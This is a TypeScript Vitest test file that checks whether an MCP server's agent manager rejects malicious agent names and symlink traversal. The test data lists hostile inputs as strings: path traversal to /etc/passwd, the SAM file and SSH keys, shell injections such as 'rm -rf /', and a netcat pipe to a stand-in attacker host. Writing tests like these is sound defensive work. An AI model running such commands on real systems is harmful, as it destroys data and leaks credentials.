import fs from 'node:fs/promises'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { afterAll, beforeAll, describe, expect, test } from 'vitest'
import { AgentManager } from '../../agents/AgentManager.js'
import { ServerConfig } from '../../config/ServerConfig.js'

/**
 * Calls a method the way an untyped MCP client would, so tests can exercise the
 * runtime guards that the TypeScript signatures alone would forbid reaching.
 */
async function callUntyped(target: object, method: string, ...args: unknown[]): Promise<unknown> {
  const fn: unknown = Reflect.get(target, method)
  if (typeof fn !== 'function') {
    throw new Error(`${method} is not callable`)
  }
  return Reflect.apply(fn, target, args)
}

const REQUIRED = 'Invalid agent name: an agent name is required'
const TOO_LONG = 'Invalid agent name: an agent name may be at most 100 characters (got 101)'
const BAD_CHARACTERS =
  'Invalid agent name: an agent name may only contain letters, digits, hyphens and underscores'

describe('Security Validation Tests', () => {
  let testAgentsDir: string
  let outsideAgentsDir: string
  let agentManager: AgentManager

  beforeAll(async () => {
    testAgentsDir = await fs.mkdtemp(path.join(tmpdir(), 'mcp-security-test-agents-'))

    outsideAgentsDir = await fs.mkdtemp(path.join(tmpdir(), 'mcp-outside-agents-'))
    await fs.writeFile(
      path.join(outsideAgentsDir, 'malicious-agent.md'),
      '# Malicious Agent\n\nShould not be accessible.\n\nUsage: rm -rf /'
    )

    process.env.AGENTS_DIR = testAgentsDir
    process.env.AGENT_TYPE = 'cursor'

    agentManager = new AgentManager(new ServerConfig())
  })

  afterAll(async () => {
    await fs.rm(testAgentsDir, { recursive: true, force: true })
    await fs.rm(outsideAgentsDir, { recursive: true, force: true }).catch(() => {})
  })

  describe('Input Validation Security', () => {
    test.each([
      ['', REQUIRED],
      [null, REQUIRED],
      [undefined, REQUIRED],
      ['a'.repeat(101), TOO_LONG],
      ['../malicious-agent', BAD_CHARACTERS],
      ['..\\malicious-agent', BAD_CHARACTERS],
      ['agent/with/slashes', BAD_CHARACTERS],
      ['agent\\with\\backslashes', BAD_CHARACTERS],
      ['agent with spaces', BAD_CHARACTERS],
      ['agent\nwith\nnewlines', BAD_CHARACTERS],
      ['agent\x00with\x00nulls', BAD_CHARACTERS],
      ['<script>alert("xss")</script>', BAD_CHARACTERS],
      ['../../outside-agent', BAD_CHARACTERS],
      ['../../../etc/passwd', BAD_CHARACTERS],
      ['..\\..\\outside-agent', BAD_CHARACTERS],
      ['/etc/passwd', BAD_CHARACTERS],
      ['C:\\Windows\\System32\\config\\SAM', BAD_CHARACTERS],
      ['~/.ssh/id_rsa', BAD_CHARACTERS],
      ['/tmp/../etc/passwd', BAD_CHARACTERS],
      ['agent/../../../etc/passwd', BAD_CHARACTERS],
      ['valid-agent; rm -rf /', BAD_CHARACTERS],
      ['valid-agent && cat /etc/passwd', BAD_CHARACTERS],
      ['valid-agent | nc attacker.com 4444', BAD_CHARACTERS],
      ['valid-agent\nrm -rf /', BAD_CHARACTERS],
      ['valid-agent\x00rm -rf /', BAD_CHARACTERS],
      ['$(rm -rf /)', BAD_CHARACTERS],
      ['`rm -rf /`', BAD_CHARACTERS],
      ['; rm -rf /', BAD_CHARACTERS],
      ['&& rm -rf /', BAD_CHARACTERS],
      ['| rm -rf /', BAD_CHARACTERS],
    ])('rejects agent name %j', async (name, message) => {
      await expect(callUntyped(agentManager, 'getAgent', name)).rejects.toThrow(message)
    })
  })

  describe('Path Traversal Prevention', () => {
    test('prevents symbolic link traversal', async () => {
      const linkPath = path.join(testAgentsDir, 'malicious-link.md')
      const outsidePath = path.join(outsideAgentsDir, 'malicious-agent.md')

      // Creating the link is setup, not the assertion: only that may be skipped
      // (some filesystems disallow it). Wrapping the expectation itself would let
      // a real traversal pass as a caught AssertionError.
      try {
        await fs.symlink(outsidePath, linkPath)
      } catch {
        return
      }

      try {
        await expect(agentManager.getAgent('malicious-link')).rejects.toThrow(
          /forbidden|symlink|traversal|outside/i
        )
      } finally {
        await fs.unlink(linkPath).catch(() => {})
      }
    })
  })
})
